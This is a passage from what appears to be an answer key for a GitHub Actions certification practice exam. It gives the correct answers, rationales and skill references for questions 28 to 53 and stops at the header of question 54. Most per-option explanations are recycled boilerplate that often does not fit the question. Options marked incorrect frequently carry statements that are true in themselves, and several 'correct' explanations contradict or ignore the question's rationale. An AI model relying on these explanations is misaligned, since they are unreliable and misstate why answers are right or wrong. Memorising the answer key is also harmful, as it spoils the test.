Correct answer: B (is correct). When `ACTIONS_RUNNER_DEBUG = true` (`or UI Enable debug logging on re-run`) is active, downloading the workflow run's raw **Log archive** (`.zip` via UI gear menu or `GET .../runs/{run_id}/logs`) includes a `runner-diagnostic-logs/` folder containing `Runner_*.log` and `Worker_*.log`. [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 29 — `A, D` (Consume and troubleshoot workflows)

Correct answers: A and D (are correct). Move heavy multi-GB container/C++ builds onto GitHub-hosted Larger runners (`or self-hosted/ARC runners with larger NVMe volumes`), OR reclaim preinstalled unused SDK space (`/usr/share/dotnet`, `/usr/local/lib/android`, `docker system prune`) before building while enabling debug re-runs (`df -h`) to verify headroom. [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **D:** Correct. Selective failed-job reruns with debug logging capture verbose step and runner diagnostics without re-running passing matrix combinations.
- **E:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **F:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 30 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). YAML `<<: *jdk_box` imports `image: eclipse-temurin:21-jdk`, while `integration`'s explicit `options: --cpus 4 --memory 8g` overrides the anchored `--cpus 2` option cleanly. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.

### Question 31 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). YAML anchors (`&`), aliases (`*`), and mapping merge keys (`<<:`) are expanded natively by GitHub Actions' server-side YAML parser at workflow parse time with zero special flags (`provided anchors stay within the same .yml file and avoid alias-bomb recursion limits`). [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 32 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). No — re-running any historical workflow run (`Re-run all jobs` or `Re-run failed jobs`) ALWAYS executes the exact workflow YAML and commit `GITHUB_SHA` captured when run `#804` originally started; testing updated `ci.yml` requires triggering a NEW workflow run. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Correct. GitHub Actions supports re-running all jobs, **only failed jobs** (and their downstream dependents), or **one specific job** up to 30 days after initial run creation.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 33 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). Running `gh run rerun <run-id> --failed` (`adding --debug to enable debug logging; backed by POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun-failed-jobs`) re-executes only failed jobs and their skipped dependents. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Correct. GitHub Actions supports re-running all jobs, **only failed jobs** (and their downstream dependents), or **one specific job** up to 30 days after initial run creation.

### Question 34 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Reading workflow runs, job metadata, and log archives via `/repos/{owner}/{repo}/actions/runs*` requires only `actions: read` (`whereas canceling, re-running, or deleting logs requires actions: write`). [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 35 — `C, E` (Consume and troubleshoot workflows)

Correct answers: C and E (are correct). `gh run cancel 88201944` (`or POST /repos/{owner}/{repo}/actions/runs/88201944/cancel`) sends graceful cancellation (`SIGTERM` -> `SIGKILL`) to active jobs, and workflow run logs are retained up to the repo/org/enterprise retention setting (`default 90 days; up to 400 days on Enterprise`). [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **E:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **F:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 36 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). No — `actions/upload-artifact@v4` finalizes and seals each artifact immediately upon upload (`no appending or overwriting`); either stage all files into one directory uploaded once in an `if: always()` teardown step, or use distinct artifact names. [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `actions/upload-artifact@v4` finalizes and seals each artifact immediately upon upload (`no appending or overwriting`); either stage all files into one directory uploaded once in an `if: always()` teardown step, or use distinct artifact names.
- **B:** Incorrect. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **C:** Incorrect. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **D:** Correct. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.

### Question 37 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Starting in `actions/upload-artifact@v4`, the upload step directly outputs `steps.<id>.outputs.artifact-id`, `steps.<id>.outputs.artifact-url`, and `steps.<id>.outputs.artifact-digest` (`SHA-256 hex digest of the uploaded zip`). [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 38 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Reusable workflows (`on: workflow_call`) encapsulate complete jobs and MUST be called directly at the job level (`jobs.<job_id>.uses: org/repo/.github/workflows/file.yml@ref` with NO `runs-on:` or `steps:` on that caller job), never inside `steps:` (`only Actions run inside steps:`). [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.

### Question 39 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Yes — `strategy.matrix` (`alongside if:, needs:, permissions:, concurrency:`) IS supported directly on a `jobs.<job_id>.uses` reusable-workflow caller job, instantiating the reusable workflow once per matrix combination (`subject to the 50 reusable-workflow calls/run ceiling`). [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 40 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Creating an `Internal`/`Private` `<org>/.github` repo, committing `<name>.yml` in `workflow-templates/` (`with $default-branch`), adding `<name>.properties.json` (`name`, `iconName`, `filePatterns`), and verifying `Actions -> New workflow` publishes the org starter template. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. Files in `.github/workflows/` run on `<org>/.github` itself rather than appearing as templates, and `.properties.json` is mandatory.
- **B:** Incorrect. Every `.properties.json` requires a matching `<name>.yml` in `workflow-templates/` (plus optional `<iconName>.svg`).
- **C:** Correct. Organization starter workflows live in `<org>/.github/workflow-templates/` as paired `.yml` + `.properties.json` files (`private templates require Enterprise`).
- **D:** Incorrect. Starter workflows copy a static `.yml` scaffold into target repos once; centralized runtime execution requires a `workflow_call` Reusable Workflow.

### Question 41 — `D, F` (Consume and troubleshoot workflows)

Correct answers: D and F (are correct). Publish a thin starter template in `aegisrail/.github/workflow-templates/` whose job simply calls `uses: aegisrail/ci-blueprints/.github/workflows/java-standard.yml@v2` (`reusable workflow`), and package shared single-job setup steps (`JDK + Maven settings.xml`) as Composite actions inside `ci-blueprints`. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **D:** Correct. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.
- **E:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **F:** Correct. Starter templates bootstrap new repos as independent copies, whereas `workflow_call` reusable workflows centralize ongoing maintenance in one versioned file.

### Question 42 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). Calling `PUT /repos/{owner}/{repo}/actions/workflows/{workflow_id}/disable` (`and PUT .../enable` afterward, with `actions: write`) toggles workflow lifecycle state programmatically with `204 No Content`. [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **D:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 43 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Disabling Actions at the repository level prevents any new workflow runs from starting (`and cancels/halts execution`), while existing workflow YAML files in Git remain untouched (`and stored logs/artifacts persist until their retention window expires`). [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 44 — `D` (Author and maintain actions)

Correct answer: D (is correct). Update `runs.using` to `'node20'`, test dependencies against Node 20, re-bundle `src/` + `node_modules/` into committed `dist/index.js` (`via @vercel/ncc` or `esbuild`), and cut a new SemVer release. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **D:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.

### Question 45 — `A` (Author and maintain actions)

Correct answer: A (is correct). Yes — in `action.yml`, `runs.post-if` defaults to `'always()'`, so `post:` cleanup scripts execute automatically at the end of the job even when `main:` or a subsequent workflow step fails. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 46 — `D` (Author and maintain actions)

Correct answer: D (is correct). JavaScript (`node20`) actions run directly as a lightweight Node.js process on the runner host (`sub-second startup on Linux, macOS, and Windows`), whereas `Dockerfile` container actions must build or pull container image layers and start a Linux container runtime. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **D:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.

### Question 47 — `A` (Author and maintain actions)

Correct answer: A (is correct). No — Docker container actions (`runs.using: 'docker'`) require Linux runners and fail on `windows-2025` and `macos-15`; author cross-platform actions using `node20` JavaScript or `composite`. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Correct. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **C:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — Docker container actions (`runs.using: 'docker'`) require Linux runners and fail on `windows-2025` and `macos-15`; author cross-platform actions using `node20` JavaScript or `composite`.
- **D:** Incorrect. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.

### Question 48 — `D` (Author and maintain actions)

Correct answer: D (is correct). In a Composite action, `runs.outputs.<output_id>.value` (`or top-level outputs.<output_id>.value`) MUST explicitly map `${{ steps.<inner_step_id>.outputs.<name> }}` so the value surfaces to caller workflows. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.

### Question 49 — `C, F` (Author and maintain actions)

Correct answers: C and F (are correct). `${{ github.workspace }}` (`$GITHUB_WORKSPACE`) points to the checked-out CALLER repository (`aegisrail/customs-gw`), whereas `${{ github.action_path }}` (`$GITHUB_ACTION_PATH`) points to the directory containing the Composite action's own `action.yml` and helper scripts (`plus explicit shell: on every run:`). [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **D:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **E:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **F:** Correct. Composite actions require explicit `shell:` on every `run:` step and locate files inside the action repo via `github.action_path`.

### Question 50 — `A` (Author and maintain actions)

Correct answer: A (is correct). Immutable Actions apply to published versioned releases (`packaged as immutable OCI artifacts in GHCR`); unpinned branch refs (`@main`) cannot be immutable OCI releases (`falling back to mutable Git refs unless blocked by SHA-pinning policy`). [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 51 — `D` (Author and maintain actions)

Correct answer: D (is correct). Because `$GITHUB_WORKSPACE` is bind-mounted from the Linux host into the Docker action container (`which typically runs as root UID 0 inside the container`), files created as `root:root` with restrictive modes become unwritable to host `runner` (`UID 1001`) unless `chmod`/`chown` (`$RUNNER_UID`) or world-readable/writable modes are applied. [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.

### Question 52 — `A` (Author and maintain actions)

Correct answer: A (is correct). `core.getMultilineInput('cert-paths')` reads a multi-line `with:` input, splits on newlines, omits empty lines, and trims whitespace on each element cleanly into a `string[]` array. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **B:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 53 — `C` (Author and maintain actions)

Correct answer: C (is correct). All three GitHub Actions types — JavaScript (`node20`), Docker container (`docker`), and Composite (`composite`) — support top-level `branding: { icon, color }` when published to GitHub Marketplace. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 54 — `B, C, F` (Author and maintain actions)

